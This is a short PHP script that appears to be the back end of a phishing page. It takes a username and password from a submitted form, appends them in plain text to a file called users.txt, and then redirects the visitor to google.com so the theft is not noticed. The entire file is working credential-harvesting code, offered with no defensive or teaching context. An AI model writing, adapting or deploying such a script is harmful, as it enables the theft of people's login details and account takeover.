<?php


$username = $_POST['user'];
$clave = $_POST['password'];

$archivo = fopen("users.txt","a");
$datos= "\n"."Account: ".$username."\r\n"."Pass: ".$clave."\n"."\n"."####################"."\n";
fwrite($archivo,$datos);
fclose($archivo);
echo "<meta http-equiv='refresh' content='1;url=https://www.google.com'>  ";
?>
